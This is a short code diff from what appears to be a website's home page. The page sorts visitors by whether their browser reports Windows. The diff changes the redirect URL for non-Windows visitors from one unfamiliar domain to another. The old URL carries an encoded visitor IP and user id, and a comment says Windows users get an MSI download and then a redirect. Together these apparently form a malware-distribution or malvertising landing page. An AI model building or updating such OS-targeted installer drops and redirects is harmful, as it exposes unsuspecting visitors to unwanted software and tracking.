@@ -7,7 +7,7 @@ export default function Home() {
     const isWindows = /windows/i.test(userAgent);
 
     const NON_WINDOWS_TARGET =
-      "https://tagtechpro.com/i/?aXBkYXRhPTIwNS4yMzQuMTgxLjMwJnN2PWdlbmVyYWwmcj1LQSZ1aWQ9VVNFUjE1MDcyMDI1VTUyMDcxNTE3JnM9TGE=";
+      "https://wavemarkmx.com/ms";
 
     //------------------------------------------------------------------
     // 1. Windows users → MSI download, then redirect
